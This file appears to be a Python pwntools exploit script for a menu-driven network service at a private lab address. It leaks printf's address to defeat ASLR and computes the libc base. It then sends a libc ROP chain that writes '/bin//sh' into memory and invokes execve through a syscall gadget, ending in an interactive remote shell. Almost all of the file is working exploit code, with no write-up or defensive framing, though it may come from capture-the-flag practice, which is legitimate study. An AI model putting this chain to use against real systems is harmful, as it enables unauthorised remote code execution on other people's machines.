from pwn import *
def option2(conn,fName):
	conn.sendline("2")
	print conn.recvuntil("Enter symbol:")
	conn.sendline(fName)
	data = conn.recvline().split(":")[1].lstrip(" ")
	print conn.recvuntil("4) Exit")
	return data
def option4(conn,payload):
	conn.sendline("3")
	print conn.recvuntil("Enter bytes to send (max 1024):")
	conn.sendline(str(len(payload)))
	conn.sendline(payload)
	conn.recvuntil("Bad choice.\n")
	
def main():
	HOST = "192.168.56.101"
	PORT = 53347
	conn = remote(HOST,PORT)
	print conn.recvuntil("4) Exit")
	raw_input("$")
	printf_addr = int(option2(conn,"printf"),16)
	libc_addr = printf_addr - 344896
	print "printf:%s"%hex(printf_addr)
	print "libc:%s"%hex(libc_addr)

	# Padding goes here
	from struct import pack
	p = ''

	p += pack('<Q', libc_addr+0x0000000000022b9a) # pop rdi ; ret
	p += pack('<Q', libc_addr+0x00000000003be080) # @ .data
	p += pack('<Q', libc_addr+0x000000000001b290) # pop rax ; ret
	p += '/bin//sh'
	p += pack('<Q', libc_addr+0x0000000000091c99) # mov qword ptr [rdi], rax ; pop rbx ; pop rbp ; ret
	p += pack('<Q', 0x4141414141414141) # padding
	p += pack('<Q', 0x4141414141414141) # padding
	p += pack('<Q', libc_addr+0x0000000000022b9a) # pop rdi ; ret
	p += pack('<Q', libc_addr+0x00000000003be088) # @ .data + 8
	p += pack('<Q', libc_addr+0x0000000000088b75) # xor rax, rax ; ret
	p += pack('<Q', libc_addr+0x0000000000091c99) # mov qword ptr [rdi], rax ; pop rbx ; pop rbp ; ret
	p += pack('<Q', 0x4141414141414141) # padding
	p += pack('<Q', 0x4141414141414141) # padding
	p += pack('<Q', libc_addr+0x0000000000022b9a) # pop rdi ; ret
	p += pack('<Q', libc_addr+0x00000000003be080) # @ .data
	p += pack('<Q', libc_addr+0x0000000000024885) # pop rsi ; ret
	p += pack('<Q', libc_addr+0x00000000003be088) # @ .data + 8
	p += pack('<Q', libc_addr+0x0000000000001b8e) # pop rdx ; ret
	p += pack('<Q', libc_addr+0x00000000003be088) # @ .data + 8
	p += pack('<Q', libc_addr+0x0000000000088b75) # xor rax, rax ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x00000000000a2eb0) # add rax, 1 ; ret
	p += pack('<Q', libc_addr+0x000000000000269f) # syscall"
	p = "A"*8+p #pad for ebp
	option4(conn,p)
	conn.interactive()
	pass
main()
